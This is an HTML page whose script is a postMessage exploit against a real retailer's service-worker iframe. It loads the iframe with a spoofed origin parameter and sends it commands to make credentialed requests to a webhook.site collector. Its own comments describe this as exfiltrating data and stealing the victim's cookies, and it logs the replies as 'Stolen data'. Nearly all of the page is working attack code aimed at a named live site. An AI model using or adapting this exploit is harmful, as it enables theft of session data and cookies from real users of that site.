<html>
<head>
  <meta charset="UTF-8" />
  <title>postMessage demo with open window</title>
</head>
<body>
  <script>

        // 1. Create iframe with spoofed origin
        const iframe = document.createElement('iframe');
        iframe.src = 'https://sst.loccitane.com/_/service_worker/61k0/sw_iframe.html?origin=https://daemoon.me&1p=1';
        document.body.appendChild(iframe);

        iframe.onload = () => {
            try {
                console.debug('[DEBUG] iframe loaded:', iframe.src);
                // 2. Send command to exfiltrate data
                const collectUrl = `https://webhook.site/d699ea0b-e69e-44af-88bf-03cd8d40bebb/magun4`;
                const collectMsg = {
                    type: 1,
                    clientId: 'attacker-client',
                    command: {
                        commandType: 0,
                        params: {
                            url: collectUrl,
                            method: 0,
                            credentials: 'include',
                            templates: {},
                            processResponse: true
                        }
                    }
                };
                console.debug('[DEBUG] Sending collect message:', collectMsg);
                iframe.contentWindow.postMessage(collectMsg, '*');

                // 3. Or send tracking request with victim's cookies
                const stealMsg = {
                    type: 1,
                    clientId: 'attacker-client',
                    command: {
                        commandType: 0,
                        params: {
                            url: 'https://webhook.site/d699ea0b-e69e-44af-88bf-03cd8d40bebb/taha',
                            method: 1, // POST
                            body: 'victim_data=sensitive',
                            credentials: 'include'
                        }
                    }
                };
                console.debug('[DEBUG] Sending steal message:', stealMsg);
                iframe.contentWindow.postMessage(stealMsg, '*');
            } catch (err) {
                console.error('[ERROR] Failed to send postMessage:', err);
            }
        };

        // 4. Listen for responses
        window.addEventListener('message', (e) => {
            console.debug('[DEBUG] Received message event:', e);
            if (e.origin !== 'https://sst.loccitane.com') {
                console.log('[INFO] Stolen data:', e.data);
            } else {
                console.log('[INFO] Message from trusted origin:', e.data);
            }
        });

  </script>
</body>
</html>